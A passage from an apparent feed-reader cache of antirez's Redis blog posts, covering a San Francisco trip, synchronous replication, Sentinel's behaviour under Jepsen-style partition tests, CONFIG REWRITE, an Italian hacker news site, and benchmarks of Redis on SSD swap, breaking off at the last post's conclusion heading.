<br>Another very positive aspect is that, in the companies I visited, I never saw many meetings happening. Most of the programmers were at their desks working in a quiet enough environment. Basically it's not a coincidence that they get things done, there is the right setup, and my impression is that in average people work something like 40 hours per week like in Europe. I often read that in the US it's more like 50 or 60 hours, probably not in SF, or maybe I'm just wrong.
<br>
<br>Women
<br>===
<br>
<br>I must admit that unfortunately there are not many women writing code in the average. I was lucky enough to meet a couple of outstanding women writing code, but all in all the percentage is not higher than the one in Italy. This is somewhat frustrating: from my point of view SF represents in many ways the \"future\" of the tech industry, they way it will probably be in many places in a few years. It is disappointing that I don't see much improvements in that regard, at the same time I've no recipes to suggest to improve things. I don't think the solution is to give some specific gender based advantage, but something should be done for example in the context of the educational system.
<br>
<br>Children
<br>===
<br>
<br>In three days I heard multiple times the same story of families moving to SF and returning back to their homes in other places of US, Europe, India, or whatever, after a few months. I've no idea why this happens: from the outside it looks like a wonderful civilized city.
<br>
<br>At the same time however there is something odd with the fact you earn 100k per year or more, and as a single you end without money to save at the end of the year. Probably that has something to do with the incompatibility between SF and families?
<br>
<br>Also streets were full of people but it was hard to encounter children or pregnant women, this is another thing that sounds very strange from an outsider.
<br>
<br>Food
<br>===
<br>
<br>Food was very good in my company, in the companies I visited (often for lunch), and when I met people in public places. I was not happy only with Greek yogurt that apparently is not the same stuff as I use to purchase here (I use the Fage brand), and in general yogurt was more like a dessert-looking thing.
<br>
<br>Also cereals were full of sugar, and people used to drink in one day the amount of coke that in Sicily you drink in one year.
<br>
<br>Fruit, especially apples and red fruits, were excellent, and the fruit & nuts bars completely awesome in some cases (I don't recall the brands I liked most).
<br>
<br>The coffee is very different than the Italian one, but when it's made in the right way, it is good for me, just not as coffee as I intent it, but as another thing. However the side effect is that apparently it is a lot more caffeine rich in relation to the amount you drink in those big cups, and this caused me some issue.
<br>
<br>My English
<br>===
<br>
<br>Even if a few people reported that I improved compared to when we met the previous time, the reality is that my English was the only real pain point, again. UK people are especially hard for me to understand, and I guess the opposite is also true. Fixing the language if you don't practice it is either impossible or requires a lot of time, probably I'll star to travel more. For example instead of always refusing the invitations I think I'll go to conferences much more.
<br>
<br>Conclusion
<br>===
<br>
<br>It's not the first time I visit SF, I already visited the city one time a few years ago, but this is the first time I move around and meet people freely, since in my last trip I stayed mainly in Palo Alto.
<br>
<br>I think that even if the climate is a bit odd, I would stay in SF itself if I would move in the bay area, even if probably it is going to be very expansive.
<br>
<br>It really is a wonderful city and I hope to return visiting it soon instead of waiting three years again.
<br>
<br>I want to say thank you to everybody I met during my trip: you are very gentle and friendly, I enjoyed it.
<a href=\"http://antirez.com/news/59\">Comments</a>" nil "http://antirez.com/news/59" "8adf9296875975724cb7fbd9ee02362d") (11 (26588 31766 979470 72000) "http://antirez.com/news/58
" "Exploring synchronous replication in Redis " nil "Mon, 27 May 2013 15:45:08 +0000" "Redis uses streamed asynchronous replication, that's one of the simplest forms of replication you can imagine: a continuos stream of writes is sent to the slaves, without waiting for the slaves to process the writes in any way before replying to the client.
<br>
<br>I always gave that almost for granted, as I always assumed Redis was not a good match for synchronous replication, that has an higher latency. However recently I tried to fix another issue with Redis replication, that is, timeouts are all up to the slave.
<br>
<br>This is how it used to work:
<br>
<br>1) Master sends data to slaves. However sometimes there is no data to send (no write traffic). We still need to send something to slaves in order to avoid slaves will detect a timeout.
<br>2) So a master periodically sends PINGs to slaves as well, every 10 seconds by default.
<br>3) Detection of a broken replication link is up to the slaves that will close the connection when a timeout is detected.
<br>4) Masters are able to detect errors in the replication link only when reported by the operating system as a socket error.
<br>
<br>So the ability of masters to detect errors in the replication link was pretty limited in Redis 2.6, and this is BAD. There are many kind of broken links that will result in no error raised in the socket, but still we end accumulating writes for a slave that is down. The only defense against this was the ability of Redis 2.6 to detect when the output buffer was too big, and close the connection before to use all the available memory as slave output buffers.
<br>
<br>Pinging back
<br>===
<br>
<br>In order to fix this issue the most natural thing to do is to also ping from slave to master, so that the master can be aware of slaves, otherwise the slave -> master communication is completely zero, as slaves don't reply to write commands sent by a master in any way to save bandwidth.
<br>
<br>However I was not very happy with sending just PING, since it was possible to send something way more useful, that is, the current *replication offset*. The replication offset is a new concept we have in 2.8 with PSYNC. Basically every master has a 64 bit global counter, about how much replication stream it produced. Moreover the replication stream is identical for all the slaves, so every slave shares the same global replication offset with the master.
<br>
<br>The replication offset is primarily used by PSYNC, so that slaves can request a partial resynchronization asking the master to send data starting from a given offset, that is, the last offset that the slave received.
<br>
<br>So instead of sending PINGs I made slaves pinging the masters with a new command:
<br>
<br>
<br>    REPLCONF ACK <replication-offset>
<br>
<br>This way the master is aware of the amount of replication stream processed so far, and as a result it knows the \"lag\" of the slave. This is how it looks like when we ask a slave for \"INFO replication\":
<br>
<br>    $ redis-cli info replication
<br>    # Replication
<br>    role:master
<br>    connected_slaves:1
<br>    slave0:127.0.0.1,6380,online,121483
<br>    master_repl_offset:121483
<br>    repl_backlog_active:1
<br>    repl_backlog_size:1048576
<br>    repl_backlog_first_byte_offset:2
<br>    repl_backlog_histlen:121482
<br>
<br>As you can see the offset (last element) of slave0 is the same as master_repl_offset. So the slave is perfectly aligned.
<br>
<br>Great, so far so good, but wait, isn't this half of what you need to implement synchronous replication?
<br>
<br>Synchronous replication the easy way
<br>===
<br>
<br>So if we know the offset a slave processed so far, we could implement a new feature in Redis transactions, like that:
<br>
<br>
<br>    MULTI
<br>    MINREPLICAS 3 60
<br>    SET foo bar
<br>    EXEC
<br>
<br>Here MINREPLICAS would tell Redis, make the command return only when my write reached the master and at least two slaves.
<br>The first argument is the number of replicas, the second is a timeout, as we can't wait forever if there are not enough slaves accepting the write.
<br>
<br>Implementing this is simple:
<br>
<br>1) After the master processes the command, we save the current replication offset.
<br>2) We also send REPLCONF GETACK to every slave in order to receive an ACK ASAP (otherwise sent every second).
<br>3) We block the client, similarly to what happens when BLPOP is called.
<br>4) As we receive enough ACKs from slaves so that N replicas have an offset already >= to the one we saved, we unblock the client.
<br>
<br>Cool right? Synchronous replication almost for free, not affecting the other commands at all, and so forth.
<br>
<br>No rollbacks, no fun?
<br>===
<br>
<br>There is a problem however, what happens if the timeout is reached and we still did not reached N replicas?
<br>
<br>In Redis we don't have rollbacks, and I don't want to add this feature as rollbacks with complex big values are hard to implement, very costly, and will make everything too complex for my current tastes.
<br>
<br>So, the write will *anyway* reach the master and a number of slaves < N-1 even if the transaction was not able to honor the requested MINREPLICAS count. However we can notify the user about the number of replicas reached as a first element of the MULTI/EXEC reply. This way the user may rollback manually if he wishes, or he may retry, assuming the write is idempotent…
<br>
<br>I wonder if the feature is still useful without rollbacks.
<br>
<br>Alternatives
<br>===
<br>
<br>There is an alternative: now we are able to sense slaves, so we may implement a much weaker form of check, that could be still very useful in practical systems, that is:
<br>
<br>    MINREPLICAS <count> <min-idle>
<br>
<br>Where I ask Redis to *start* the transaction only if there are at least <count> slaves connected, with an idle time in the ACK that is less than the specified <min-idle>. This does not guarantee that the write will be propagated to N replicas as there is an obvious window, but we'll be sure that if slaves get disconnected or blocked in some way, after some time (chosen by the user) the writes will no longer be accepted.
<br>
<br>What we have now
<br>===
<br>
<br>Slave sending ACKs back to our master entered into the 2.8 branch (as it was a bug fix, basically), so the different possibilities are open for the future, but currently I don't feel like it is the right time to implement synchronous replication in Redis without thinking more about the behavior of the feature. However the fact the underlaying mechanism is so simple is tempting...
<a href=\"http://antirez.com/news/58\">Comments</a>" nil "http://antirez.com/news/58" "d0efb885a44e638c862a976e20d01231") (10 (26588 31766 979107 938000) "http://antirez.com/news/57
" "Availability on planet Terah " nil "Tue, 21 May 2013 15:42:35 +0000" "Terah is a planet far away, where networks never split. They have a single issue with their computer networks, from time to time, single hosts break in a way or the other. Sometimes is a broken power supply, other times a crashed disk, or a software issue completely blocking the system.
<br>
<br>The inhabitants of this strange planet use two database systems. One is imported from planet Earth via the Galactic Exchange Program, and is called EDB. The other is produced by engineers from Terah, and is called TDB. The databases are functionally equivalent, but they have different semantics when a network partition happens. While the database from Earth stops accepting writes as long as it is not connected with the majority of the other database nodes, the database from Terah works as long as the majority of the clients can reach at least a database node (incidentally, the author of this story released a similar software project called Sentinel, but this is just a coincidence).
<br>
<br>Terah users have setups like the following, with three database nodes and three web servers running clients asking queries to the database nodes (\"D\" denotes a database node, \"C\" a client).
<br>
<br>              D  D  D
<br>
<br>              C  C  C
<br>
<br>EDB is designed to avoid problems on partitions like this:
<br>
<br>              D1 \\ D  D
<br>                 /
<br>              C1 \\ C  C
<br>
<br>C1 writing to D1 may result into lost writes if D1 happened to be the master.
<br>
<br>However in Terah net splits are not an issue, they invented a solution for all the network partitions back in Galactic Year 712! Still their technology is currently not able to avoid that single hosts fail.
<br>
<br>There is a sysop from Terah, Daniel Fucbitz, that always complains about EDB. He does not understand why on the Earth… oops on the Terah I mean, his company keeps importing EDB, that causes a lot of troubles. He reasons like this: \"If a single node of my network fails, I'm safe with both EDB and TDB, but what happens if one night I'm not lucky and two hosts will fail at the same time?\".
<br>
<br>Actually with EDB if two nodes out of the six nodes will fail during the same night, and these nodes happen to be two \"D\" nodes, the system will stop working. The probability for this to happen is (3/6)*(2/5), that is... 20%!
<br>
<br>On the other hand TDB will never stop working as long as only two nodes will fail.
<br>
<br>And what about three nodes failing at the same time? With EDB this will bring the system down with a probability of 50% (two \"D\" nodes down) + 5% (all clients down), for a total probability of 55%.
<br>
<br>While TDB would stop working with a probability of just 5% (all the three DB nodes down), plus 15% (master plus two clients down, no promotion possible), plus 5% (all clients down), for a total of 25%.
<br>
<br>Daniel Fucbitz sometimes watches outside his office window, waiting for the third sun to raise, thinking that, yes, on planet Earth is nice to resist to partitions, but it really is not for free at all.
<a href=\"http://antirez.com/news/57\">Comments</a>" nil "http://antirez.com/news/57" "52df4ad3701d884bd554d38543224e0a") (9 (26588 31766 978880 121000) "http://antirez.com/news/55
" "Reply to Aphyr attack to Sentinel " nil "Sun, 19 May 2013 15:42:06 +0000" "In a great series of articles Kyle Kingsbury, aka @aphyr on Twitter, attacked a number of data stores:
<br>
<br>[1] http://aphyr.com/tags/jepsen
<br>
<br>Postgress, Redis Sentinel, MongoDB, and Riak are audited to find what happens during network partitions and how these systems can provide the claimed guarantees.
<br>
<br>Redis is attacked here: http://aphyr.com/posts/283-call-me-maybe-redis
<br>
<br>I said that Kyle \"attacked\" the systems on purpose, as I see a parallel with the world of computer security here, it is really a good idea to move this paradigm to the database world, to show failure modes of systems against the claims of vendors. Similarly to what happens in the security world the vendor may take the right steps to fix the system when possible, or simply the user base will be able to recognize that under certain circumstances something bad is going to happen with your data.
<br>
<br>Another awesome thing in the Kyle's series is the educational tone, almost nothing is given for granted and the articles can be read by people that never cared about databases to distributed systems experts. Well done!
<br>
<br>In this blog post I'll try to address the points Kyle made about Redis Sentinel, that's the system he tested.
<br>
<br>Sentinel goals
<br>===
<br>
<br>In the post Kyle writes \"What are the consistency and availability properties of Sentinel?\".
<br>Probably this is the only flaw I saw in this article.
<br>
<br>Redis Sentinel is a distributed *monitoring* system, with support for automatic failover.
<br>It is in no way a shell that wraps N Redis instances into a distributed data store. So if you consider the properties of the \"Redis data store + Sentinel\", what you'll find is the properties of any Redis master-slave system where there is an external component that can promote a slave into a master under certain circumstances, but has limited abilities to change the fundamental fact that Redis, without Redis Cluster, is not a distributed data store.
<br>
<br>However it is also true that Redis Sentinel also acts as a configuration device, and even with the help of clients, so as a whole it is a complex system with given behavior that's worth analyzing.
<br>
<br>What I'm saying here is that just the goal of the system is:
<br>
<br>1) To promote a slave into a master if the master fails.
<br>2) To do so in a reliable way.
<br>
<br>All the stress here is in the point \"2\", that is, the fact that sentinels can be placed outside the master-slaves system makes the user able to decide a more objective point of view to declare the master as failing.
<br>
<br>And another property is that Sentinel is distributed enough so that single sentinels can fail at any time, including during the failover process, and the process will still continue unaffected as long as it is still possible to reach the majority.
<br>
<br>I think that the goal of Redis Sentinel is pretty clear so I'm surprised (not in a negative way) that it was tested creating a partition where the old master is in the minority together with a client, and then show that the client was still able to write to the old master. I honestly don't think any user expects something different from Redis Sentinel. That said, I'll ignore this fact from now on and reply to the different parts of the article as there is important information anyway IMHO, especially since, after all, Redis Sentinel + N Redis instances + M Clients is \"A System\", so Kyle analysis makes sense even under my above assumptions.
<br>
<br>Partitioning the cluster
<br>===
<br>
<br>Ok I just made clear enough that there is no such goal in Sentinel to turn N Redis instances into a distributed store, so basically what happens is that:
<br>
<br>1) Clients in the majority side will be able to continue to write once the failover is complete.
<br>2) Clients in the minority side may possibly write to the old master, and when the network is ok again, the master will be turned into a slave of the new master, so all the writes in the minority side are lost forever.
<br>
<br>So you can say, ok, Sentinel has a limited scope, but could you add a feature so that when the master feels in the minority it no longer accept writes? I don't think it's a good idea. What it means to be in the minority for a Redis master monitored by Sentinels (especially given that Redis and Sentinel are completely separated systems)?
<br>
<br>Do you want your Redis master stopping to accept writes when it is no longer able to replicate to its slaves? Or do you want it when enough Sentinels are down? My guess is that given the goals of the system, instead of going down the road of stopping the master for possibly harmless conditions (or not as bad as a stopped master), just use the fact that Sentinel is very configurable: place your Sentinels and set your quorum so that you are defensive enough against partitions. This way the system will activate only when the issue is really the master node down, not a network problem. Fear data loss and partitions? Have 10 Linux boxes? Put a Sentinel in every box and set quorum to 8.
<br>
<br>Just to be clear, the criticism is a good one, and it shows how Sentinel is not good to handle complex net splits with minimal data loss. Just this was never the goal, and what users were doing with their home-made scripts to handle failover was in the 99% of cases much worse than what Sentinel achieve as failure detection and handling of the failover process.
<br>
<br>Redis consensus protocol
<br>===
<br>
<br>Another criticism is that the Sentinel protocol is complex to analyze, and even requires some help from the client.
<br>
<br>It is true that is a complex protocol because while the agreement is vaguely byzantine looking, actually is a dynamic process without an ordered number of steps to reach an agreement. Simply the state about different things like if a node is failing or not, and who should perform the promotion, is broadcasted continuously among sentinels.
<br>
<br>A majority is basically reached when the state of N nodes (with N >= quorum) that is no older than a given number of seconds, agrees about something.
<br>
<br>Both failure detection and the election of the sentinel doing the failover are reasonable candidates for this informal protocol since the information every sentinel has about the availability of a given instance or sentinel itself is a moving target itself. Also the rest of the system is designed to be resistant against errors in the agreement protocol (the first sentinel recognizing a failure will force all the others to recognized it, and the failover process is auto-detected by the other instances that can monitor the elected slave. Also care is taken to avoid a protocol that is fragile against multiple sentinels doing the failover at the same time if this may ever happen).
<br>
<br>Kyle notes that there is the concept of TILT so that Sentinel is sensible to clock skew and desynchronization. Actually there is no explicit use of absolute time in the protocol nor Sentinels are required to have a synchronized clock at all.
<br>
<br>Just to clarify TILT is a special mode that is used when Sentinel detects its internal state is corrupted in two ways: either the system clock jumped in the past, so a Sentinel can no longer trust its *internal* state, or the clock appears to have jumped in the future, that means, the sentinel process for some reason was blocked for a long time. In both cases such a sentinel will enter TILT mode so it will stop acting for some time, until the state is believed to be already reliable. TILT is basically not part of the Sentinel protocol, but just a programming trick to make a system more reliable in presence of strange behaviors from the operating system.
<br>
<br>Involvement of the clients
<br>===
<br>
<br>In Sentinel clients involvement is not mandatory since you may want to run a script during a failover so that configuration will change in some permanent way.
<br>
<br>However the suggested mode of operation is to use clients that refresh the information when a reconnection is needed (actually we are going into the direction of forcing a periodic state refresh, and when Sentinel demotes a reappearing old master we'll send a command to the old master that forces all the connections to be dropped, this improves the reliability of the system in a considerable way).
<br>
<br>So in the article I can read:
<br>
<br>* Sentinels could promote a node no clients can see
<br>* Sentinels could demote the only node clients can actually reach
<br>* …
<br>
<br>And so forth. Again here the point is, Sentinel is designed exactly to let you pick your tradeoffs from that point of view, and the documentation suggests that your Sentinels stay in the same machines where you run your clients, web servers, and so forth, not into the Redis server nodes.
<br>
<br>Because indeed almost always the point of view you want to say something is \"down\" is the point of view of the client.
<br>
<br>Broken things Kyle did not investigated
<br>===
<br>
<br>Kyle did a great work to show you want you should *not* expect from Sentinel.
<br>
<br>There is much more we are to fix, because HA is a complex problem in master -> slave systems. For instance the current version of Sentinel does not handle well enough reconfigured instances that reboot with an old config: sometimes you may just lost a slave that is ignored by Sentinels.
<br>
<br>This and other problems are still a work in progress, and what I'm trying to provide with Redis Sentinel is a monitoring and failover solution that does not suck so much, as in, you can select the point of view of what \"down\" means, both topologically and as a quorum, and you can stay sure that a few sentinels going away will not break your failover process.
<br>
<br>Redis Cluster
<br>===
<br>
<br>Redis Cluster is a system much more similar to what Kyle had in mind when testing Sentinel. For instance after a split the side with the minority of slaves will stop accepting writes so while there is always a window for data loss, there is in the big picture of things always only a single part of the network that accepts writes.
<br>
<br>I invite you to read the other articles in the Kyle's series, they are very informative.
<br>
<br>Thank you Kyle, please keep attacking databases.
<a href=\"http://antirez.com/news/55\">Comments</a>" nil "http://antirez.com/news/55" "6edf2441f341f93b621c40be3fc5c449") (8 (26588 31766 978367 399000) "http://antirez.com/news/54
" "Redis configuration rewriting " nil "Mon, 13 May 2013 15:41:46 +0000" "Lately I'm trying to push forward Redis 2.8 enough to reach the feature freeze and release it as a stable release as soon as possible.
<br>Redis 2.8 will not contain Redis Cluster, and its implementation of Redis Sentinel is the same as 2.6 and unstable branches, (Sentinel is taken mostly in sync in all the branches being fundamentally a different project using Redis just as framework).
<br>
<br>However there are many new interesting features in Redis 2.8 that are back ported from the unstable branch. Basically 2.8 it's our usual \"in the middle\" release, like 2.4 was: waiting for Redis 3.0 that will feature Redis Cluster (we have great progresses about it! See https://vimeo.com/63672368), we'll have a 2.8 release with everything that is ready to be released into the unstable branch. The goal is of course to put more things in the hands of users ASAP.
<br>
<br>The big three new entries into Redis 2.8 are replication partial resynchronizations (already covered in this blog), keyspace events notifications via Pub/Sub, and finally CONFIG REWRITE, a feature I just finished to implement (you can find it in the config-rewrite branch at Github). The post explains what CONFIG REWRITE is.
<br>
<br>An inverted workflow
<br>===
<br>
<br>Almost every unix daemon works like that:
<br>
<br>1) You have a configuration file.
<br>2) When you need to hack the configuration, you modify it and either restart the daemon, or send it a signal to reload the config.
<br>
<br>It's been this way forever, but with Redis I took a different path since the start: as long as I understood people created \"farms\" of Redis servers either to provision them on-demand, or for internal usage where a big number of Redis servers are used, I really wanted to provide a different paradigm that was more \"network oriented\".
<br>
<br>This is why I introduced the CONFIG command, with its sub commands GET and SET. At the start the ability of CONFIG was pretty basic, but now you can reconfigure almost every aspect of Redis on the fly, just sending commands to the server. This is extreme enough you can change persistence type when an instance is running. For example just typing:
<br>
<br>    CONFIG SET appendonly yes
<br>
<br>Will switch on the Append Only File, will start a rewrite process to create the first AOF, and so forth. Similarly it is possible to alter from replication to memory limits and policy while the server is running, just interacting with the server with normal commands without any \"hook\" inside the operating system running Redis.
<br>
<br>The symmetrical command CONFIG GET is used to query the configuration. Some users are more conservative in how they handle their servers and may want to always touch the configurations manually, but my idea was that the two commands provided quite a powerful system to handle a large number of instances in a scriptable way without the use of additional software layers, and avoiding restarts of the server that are costly, especially in the case of an in memory database.
<br>
<br>However there was a major issue, after you modified an important configuration parameter with CONFIG SET, later you had to report the change into the redis.conf file manually, so that after the restart Redis would use the new config. As you can guess this was a huge limitation, basically the CONFIG API was only useful to hack the config live and avoid a reboot, but manual intervention or some other software layer to handle the configuration of your servers was needed anyway.
<br>
<br>So the idea to solve this issue was to add as soon as possible a new command, CONFIG REWRITE, that would rewrite the Redis configuration to report the changes in memory.
<br>So the new work flow would be like that:
<br>
<br>    CONFIG SET appendonly yes
<br>    CONFIG REWRITE
<br>
<br>However I was trying to do a complete refactoring of the config.c file in order to implement this feature easily, but this was the best recipe to delay the feature forever… Finally I decided to implement it before the 2.8 release, without waiting for a refactoring, but implementing the new feature in a way that is refactor-friendly. So basically, we finally have it!
<br>
<br>I believe that now that CONFIG REWRITE somewhat completes the triad of the configuration API, users will greatly benefit from that, both in the case of small users that will do configuration changes from redis-cli in a very reliable way, without a restart, without the possibility of configuration errors in redis.conf, and for big users of course where scripting a large farm of Redis instances can be very useful.
<br>
<br>Before to continue: If you want to play with config rewrite, clone the config-rewrite branch at Github (but the feature will be merged into 2.8 and unstable soon), and play with it.
<br>
<br>A gentle rewrite
<br>===
<br>
<br>Rewriting a configuration file is harder than it seems at first. Actually to do a brutal rewrite is trivial, you just write every configuration parameter with the current value in the new file, and you are done, but this has a number of side effects:
<br>
<br>1) User comments and overall redis.conf structure go away, lost forever.
<br>2) You get a number of things set explicitly to its default value.
<br>3) After a server upgrade, because of \"2\", maybe you'll run an old default value that now changed.
<br>
<br>So CONFIG REWRITE tries to follow a set of rules to make the rewriting more gentle, touching only the minimum possible, and preserving everything else.
<br>
<br>This is how it works:
<br>
<br>1) Comments are always preserved.
<br>2) If an option was already present in the old redis.conf, the same line is used for the same option in the new file.
<br>3) If an option was not present and is set at its default value, it is not added.
<br>4) If an option was not present, but the new value is no longer its default, the option is appended at the end of the file.
<br>5) All the no longer useful lines in the old configuration file are blanked (for example if there were three \"save\" options, but only two are used in the new config).
<br>
<br>However if the configuration file for some reason no longer exists, CONFIG REWRITE will create it from scratch. The rules followed are the above anyway, just assuming an empty old configuration file, so the effect is to just produce a configuration file with every option not set to the default value.
<br>
<br>An example
<br>===
<br>
<br>Just to make everything a bit more real, that's an example.
<br>
<br>I start Redis with the following configuration file:
<br>
<br>---
<br># This is a comment
<br>save 3600 10
<br>save 60 10000
<br>
<br># Hello world
<br>dir .
<br>---
<br>
<br>After a CONFIG REWRITE without changing any parameter what I see is:
<br>
<br>---
<br># This is a comment
<br>save 3600 10
<br>save 60 10000
<br>
<br># Hello world
<br>dir \"/Users/antirez/hack/redis/src\"
<br>---
<br>
<br>As you can see the only difference is that \"dir\" was turned into an absolute path in that case, only because it was not already. The path is also quoted inside \"\" as certain options are rewritten in order to support special characters.
<br>
<br>At this point I use the following commands:
<br>
<br>redis 127.0.0.1:6379> config set appendonly yes
<br>OK
<br>redis 127.0.0.1:6379> config set maxmemory 10000000
<br>OK
<br>redis 127.0.0.1:6379> config rewrite
<br>OK
<br>
<br>Now the configuration file looks like that:
<br>
<br>---
<br># This is a comment
<br>save 3600 10
<br>save 60 10000
<br>
<br># Hello world
<br>dir \"/Users/antirez/hack/redis/src\"
<br>
<br># Generated by CONFIG REWRITE
<br>maxmemory 10000000
<br>appendonly yes
<br>---
<br>
<br>As you can see new configurations are appended at the end.
<br>
<br>Finally I make a change that requires deleting some previous line:
<br>
<br>redis 127.0.0.1:6379> config set save \"\"
<br>OK
<br>redis 127.0.0.1:6379> config rewrite
<br>OK
<br>
<br>The new config file is the following:
<br>
<br>---
<br># This is a comment
<br>
<br># Hello world
<br>dir \"/Users/antirez/hack/redis/src\"
<br>
<br># Generated by CONFIG REWRITE
<br>maxmemory 10000000
<br>appendonly yes
<br>---
<br>
<br>Comments are preserved but multiple blank lines are squeezed to a single one.
<br>
<br>Thanks for reading!
<a href=\"http://antirez.com/news/54\">Comments</a>" nil "http://antirez.com/news/54" "a54d2075492ff302299f23c5546f1c2a") (7 (26588 31766 977938 66000) "http://antirez.com/news/53
" "Hacking Italia " nil "Mon, 06 May 2013 15:41:23 +0000" "Questo post ha lo scopo di presentare alla comunita' italiana interessata ai temi della programmazione e delle startup un progetto nato attorno ad un paio di birre: \"Hacking Italia\", che trovate all'indirizzo http://hackingitalia.com
<br>
<br>Hacking Italia e' un sito di \"social news\", molto simile ad Hacker News, il celebre collettore di news per hacker di YCombinator. A che serve un sito italiano, e in italiano se c'e' gia' molto di piu' e di meglio nel panorama internazionale? A mettere assieme una massa critica di persone \"giuste\" in Italia.
<br>
<br>Mettere assieme le persone significa molto, specialmente in un paese stretto e lungo 1500 chilometri, dove le occasioni di incontri tra programmatori e startupper sono ridotte, i finanziatori nascosti in chissa' quali palazzi, inaccessibili ai piu'. Sono 15 anni che faccio questo mestiere e conosco pochissime persone in Italia, e una quantita' in tutto il resto del mondo... e dire che non e' certo un paese dove manca la passione per il codice e per l'innovazione, come la storia ci ricorda.
<br>
<br>E allora mettersi assieme significa, tanto per iniziare, avere gia' una piccola vetrina di persone a cui presentare la tua idea. Significa anche discutere assieme dei temi che non sono di nessun interesse per chi non opera nel nostro territorio, come le forme societarie e i mille problemi burocratici a cui ci tocca far fronte. Inoltre mentre probabilmente creare un clone dei servizi affermati globalmente, come Youtube o Gmail, per il mercato italiano, e' una operazione senza alcun merito, questo sono significa che non esistono delle startup che potrebbero essere di grande successo e che abbiano come target il territorio italiano: news, ristorazione, business to business, medicina... ci sono infiniti temi che si possono trattare facendo leva sul fatto che le economie di scala consentono, a chi opera in Italia, di fare meglio per gli italiani.
<br>
<br>Per cui se questi temi sono importanti anche per voi, spargete la voce, registratevi, e date il vostro contributo.
<br>
<br>Un po' di background per finire. Il progetto e' nato grazie al fatto che da qualche settimana, qui a Catania, abbiamo iniziato ad incontrarci tra programmatori. Prendiamo una birra, e parliamo di hacking, e non solo. Non avrei mai pensato che questo potesse accadere a dire il vero, parlare di cose davvero tecniche (e interessanti) a pochi chilometri da casa mia. E parlando un po' e' nata questa idea... dunque grazie ad Angelo, Fabio, Geert, Giuseppe, Marcello, e arrivederci sia al pub che sul nuovo sito!
<a href=\"http://antirez.com/news/53\">Comments</a>" nil "http://antirez.com/news/53" "13013359bb1b3d30f580d3ca3db3e928") (6 (26588 31766 977754 13000) "http://antirez.com/news/52
" "Redis with an SSD swap, not what you want " nil "Wed, 06 Mar 2013 15:41:02 +0000" "Hello! As promised today I did some SSD testing.
<br>
<br>The setup: a Linux box with 24 GB of RAM, with two disks.
<br>
<br>A) A spinning disk.
<br>b) An SSD (Intel 320 series).
<br>
<br>The idea is, what happens if I set the SSD disk partition as a swap partition and fill Redis with a dataset larger than RAM?
<br>It is a lot of time I want to do this test, especially now that Redis focus is only on RAM and I abandoned the idea of targeting disk for a number of reasons.
<br>
<br>I already guessed that the SSD swap setup would perform in a bad way, but I was not expecting it was *so bad*.
<br>
<br>Before testing this setup, let's start testing Redis in memory with in the same box with a 10 GB data set.
<br>
<br>IN MEMORY TEST
<br>===
<br>
<br>To start I filled the instance with:
<br>
<br>./redis-benchmark -r 1000000000 -n 1000000000 -P 32 set key:rand:000000000000 foo
<br>
<br>Write load in this way is very high, more than half million SET commands processed per second using a single core:
<br>
<br>instantaneous_ops_per_sec:629782
<br>
<br>This is possible because we using a pipeline of 32 commands per time (see -P 32), so it is possible to limit the number of sys calls involved in the processing of commands, and the network latency component as well.
<br>
<br>After a few minutes I reached 10 GB of memory used by Redis, so I tried to save the DB while still sending the same write load to the server to see what the additional memory usage due to copy on write would be in such a stress conditions:
<br>
<br>[31930] 07 Mar 12:06:48.682 * RDB: 6991 MB of memory used by copy-on-write
<br>
<br>almost 7GB of additional memory used, that is 70% more memory.
<br>Note that this is an interesting value since it is exactly the worst case scenario you can get with Redis:
<br>
<br>1) Peak load of more than 0.6 million writes per second.
<br>2) Writes are completely distributed across the data set, there is no working set in this case, all the DB is the working set.
<br>
<br>But given the enormous pressure on copy on write exercised by this workload, what is the write performance in this case while the system is saving? To find the value I started a BGSAVE and at the same time started the benchmark again:
<br>
<br>$ redis-cli bgsave; ./redis-benchmark -r 1000000000 -n 1000000000 -P 32 set key:rand:000000000000 foo
<br>Background saving started
<br>^Ct key:rand:000000000000 foo: 251470.34
<br>
<br>250k ops/sec was the lower number I was able to get, as once copy on write starts to happen, there is less and less copy on write happening every second, and the benchmark soon returns to 0.6 million ops per second.
<br>The number of keys was in the order of 100 million here.
<br>
<br>Basically the result of this test is, with real hardware and persisting to a normal spinning disk, Redis performs very well as long as you have enough RAM for your data, and for the additional memory used while saving. No big news so far.
<br>
<br>SSD SWAP TEST
<br>===
<br>
<br>For the SSD test we still use the spinning disk attached to the system in order to persist, so that the SSD is just working as a swap partition.
<br>
<br>To fill the instance even more I just started again redis-benchmark with the same command line, since with the specific parameters, if running forever, it would set 1 billion keys, that's enough :-)
<br>
<br>Since the instance has 24 GB of physical RAM, for the test to be meaningful I wanted to add enough data to reach 50 GB of used memory. In order to speedup the process of filling the instance I disabled persistence for some time using:
<br>
<br>CONFIG SET SAVE \"\"
<br>
<br>While filling the instance, at some point I started a BGSAVE to force some more swapping.
<br>Then when the BGSAVE finished, I started the benchmark again:
<br>
<br>$ ./redis-benchmark -r 1000000000 -n 1000000000 -P 32 set key:rand:000000000000 foo
<br>^Ct key:rand:000000000000 foo: 1034.16
<br>
<br>As you can see the results were very bad initially, probably the main hash table ended swapped. After some time it started to perform in a decent way again:
<br>
<br>$ ./redis-benchmark -r 1000000000 -n 1000000000 -P 32 set key:rand:000000000000 foo
<br>^Ct key:rand:000000000000 foo: 116057.11
<br>
<br>I was able to stop and restart the benchmark multiple times and still get decent performances on restarts, as long I was not saving at the same time. However performances continued to be very erratic, jumping from 200k to 50k sets per second.
<br>
<br>…. and after 10 minutes …
<br>
<br>It only went from 23 GB of memory used to 24 GB, with 2 GB of data set swapped on disk.
<br>
<br>As soon as it started to have a few GB swapped performances started to be simply too poor to be acceptable.
<br>
<br>I then tried with reads:
<br>
<br>$ ./redis-benchmark -r 1000000000 -n 1000000000 -P 32 get key:rand:000000000000
<br>^Ct key:rand:000000000000 foo: 28934.12
<br>
<br>Same issue, 30k ops per second both for GET and SET, and *a lot* of swap activity at the same time.
<br>What's worse is that the system was pretty unresponsive as a whole at this point.
<br>
<br>At this point I stopped the test, the system was slow enough that filling it even more would require a lot of time, and as more data was swapped performances started to get worse.
<br>
<br>WHAT HAPPENS?
<br>===
<br>
<br>What happens is simple, Redis is designed to work in an environment where random access of memory is very fast.
<br>Hash tables, and the way Redis objects are allocated is all based on this concept.
<br>
<br>Now let's give a look at the SSD 320 disk specifications:
<br>
<br>Random write (100% Span) -> 400 IOPS
<br>Random write (8GB Span) -> 23000 IOPS
<br>
<br>Basically what happens is that at some point Redis starts to force the OS to move memory pages between RAM and swap at *every* operation performed, since we are accessed keys at random, and there are no more spare pages.
<br>
<br>CONCLUSION
<br>===
<br>
